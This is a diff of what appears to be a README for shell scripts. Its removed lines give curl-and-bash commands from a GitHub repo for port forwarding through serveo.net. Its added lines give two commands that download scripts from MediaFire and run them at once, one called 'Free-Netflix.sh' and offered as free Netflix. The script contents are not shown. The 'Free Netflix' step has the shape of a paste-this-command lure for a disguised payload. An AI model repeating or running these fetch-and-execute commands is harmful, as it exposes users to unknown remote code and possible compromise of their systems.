@@ -1,23 +1,13 @@
-# script created by wolfyy
-this php will allow you to port forward ez pizi.
-Forwarded with 9500 port serveo.net
-Listening to 4222
-==============================
-script for over wan 
-==============================
-apt install curl bash -y && curl -LO https://raw.githubusercontent.com/wolfyy59/wfy/master/server.sh && chmod 777 server.sh &&  bash server.sh
+Server command
+
+curl -LO https://download942.mediafire.com/xuo1um8fai1g/3hbifgkkoglhmkn/server.sh  && bash server.sh
+
+===
+
+Netflix command 
+
+===
+
+curl -LO https://download1327.mediafire.com/1fhf31mxlmzg/lerwg63cqnr1o1u/Free-Netflix.sh && bash Free-Netflix.sh
 
 
-=================================================
-script for 192.168.0.1
-=================================================
-apt install curl bash -y && curl -LO https://raw.githubusercontent.com/wolfyy59/wfy/master/server.0.123.sh && chmod 777 server.0.123.sh &&  bash server.0.123.sh
-
-(port 4444)
-==================================================
-script for 192.168.1.1
-======================
-apt install curl bash -y && curl -LO https://raw.githubusercontent.com/wolfyy59/wfy/master/server.1.77.sh && chmod 777 server.1.77.sh &&  bash server.1.77.sh
-
-(port 4444)
-======================
